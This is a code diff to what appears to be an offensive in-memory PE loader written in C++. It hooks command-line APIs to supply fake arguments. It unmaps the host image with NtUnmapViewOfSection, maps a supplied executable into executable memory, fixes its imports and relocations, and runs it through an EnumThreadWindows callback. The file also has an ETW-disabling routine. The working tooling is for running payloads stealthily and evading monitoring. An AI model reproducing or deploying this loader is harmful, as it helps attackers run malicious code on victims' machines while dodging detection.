@@ -10,6 +10,8 @@
 #include <string.h>
 #include <metahost.h> 
 #include <evntprov.h>
+#include"peBase.hpp"
+#include"fixReloc.hpp"
 
 #pragma warning (disable: 4996)
 #pragma comment(lib,"WS2_32.lib")
@@ -29,12 +31,23 @@ using namespace std;
 
 #pragma comment(lib, "winhttp")
 
-bool hijackCmdline = false;
+const char* masquerade_ansi_string = "masquerade_ansi_string 11 22 33";
+const wchar_t* masquerade_unicode_string = L"masquerade_unicode_string 11 22 33";
+
+bool hijackCmdline = true;
 char* sz_masqCmd_Ansi = NULL, * sz_masqCmd_ArgvAnsi[100] = {  };
 wchar_t* sz_masqCmd_Widh = NULL, * sz_masqCmd_ArgvWidh[100] = { };
 int int_masqCmd_Argc = 0;
-LPWSTR hookGetCommandLineW() { return sz_masqCmd_Widh; }
-LPSTR hookGetCommandLineA() { return sz_masqCmd_Ansi; }
+LPWSTR hookGetCommandLineW() { 
+    printf("[+]call hooked hookGetCommandLineW\n");
+    return (LPWSTR)sz_masqCmd_Widh;
+}
+
+LPSTR hookGetCommandLineA() { 
+    printf("[+]call hooked hookGetCommandLineA\n");
+    
+    return (LPSTR)sz_masqCmd_Ansi;
+}
 
 typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
@@ -123,13 +136,28 @@ void DisableETW(void) {
 
 
 int __wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
+    /*int_masqCmd_Argc = 3;
+    const wchar_t* testArumentW[] = { L"param1",L"param2",L"param3" };
+
+    for (int i = 0; i < int_masqCmd_Argc; i++) {
+        sz_masqCmd_ArgvWidh[i] = (wchar_t*)testArumentW[i];
+    }*/
     *_Argc = int_masqCmd_Argc;
     *_Argv = (wchar_t**)sz_masqCmd_ArgvWidh;
+    printf("[+]call hooked __wgetmainargs\n");
     return 0;
 }
 int __getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless) {
+    /*int_masqCmd_Argc = 3;
+    const char* testArument[] = { "param1","param2","param3" };
+
+    for (int i = 0; i < int_masqCmd_Argc; i++) {
+        sz_masqCmd_ArgvAnsi[i] = (char*)testArument[i];
+    }*/
+
     *_Argc = int_masqCmd_Argc;
     *_Argv = (char**)sz_masqCmd_ArgvAnsi;
+    printf("[+]call hooked __getmainargs\n");
     return 0;
 }
 
@@ -253,26 +281,39 @@ void PELoader(char* data, const long long datasize)
 
     IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
     preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
-
-
-    //printf("  -- 2 GET API NtUnmapViewOfSection from ntdll.dll\n");
-    HMODULE dll = LoadLibraryA("ntdll.dll");
-    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
-
-    //printf("  -- 3 VirtualAlloc Memory\n");
-    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!pImageBase) {
-        if (!relocDir) {
+    printf("[+]current process ImageBase:%p\n", GetModuleHandle(NULL));
+    printf("[+]preferAddr:%p\n", (LPVOID)ntHeader->OptionalHeader.ImageBase);
+    if (preferAddr == GetModuleHandle(NULL)) {
+        pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!pImageBase || !relocDir)
+        {
             exit(0);
         }
-        else {
-            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (!pImageBase)
-            {
+    }
+    else {
+        //printf("  -- 2 GET API NtUnmapViewOfSection from ntdll.dll\n");
+        HMODULE dll = LoadLibraryA("ntdll.dll");
+        int unmapResult = ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
+        printf("[+]unmapResult:%x\n", unmapResult);
+
+        //printf("  -- 3 VirtualAlloc Memory\n");
+        pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!pImageBase) {
+            if (!relocDir) {
                 exit(0);
             }
+            else {
+                pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (!pImageBase)
+                {
+                    exit(0);
+                }
+            }
         }
+        FreeLibrary(dll);
     }
+    printf("[+]New exe ImageBase:%p\n", pImageBase);
+    
     //printf("  -- 4 FILL the memory block with PEdata\n");
     ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
     memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
@@ -286,6 +327,13 @@ void PELoader(char* data, const long long datasize)
     //printf("  -- 5 Fix the PE Import addr table (pImageBase:%p)\n", pImageBase);
     RepairIAT(pImageBase);
 
+    //Fix Relocation table
+    if (pImageBase != preferAddr) {
+        if (myApplyReloc((ULONG_PTR)pImageBase, (ULONG_PTR)preferAddr)) {
+            printf("[+] Relocation Fixed.");
+        }
+    }
+
     //printf("  -- 6 Seek the AddressOfEntryPoint\n");
     size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
     //printf("  -- 7 Rush the PE in Memory (size %ld)(addr %p)(chksum %ud)\n", datasize, retAddr, chksum);
@@ -295,10 +343,7 @@ void PELoader(char* data, const long long datasize)
     EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
     
 
-    // create new thread mablanch:
-    //printf("this is argument : %s\n", arguments); 
-    //HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)retAddr, 0, 0, 0);
-    //WaitForSingleObject(hThread, INFINITE); 
+  
 }
 
 
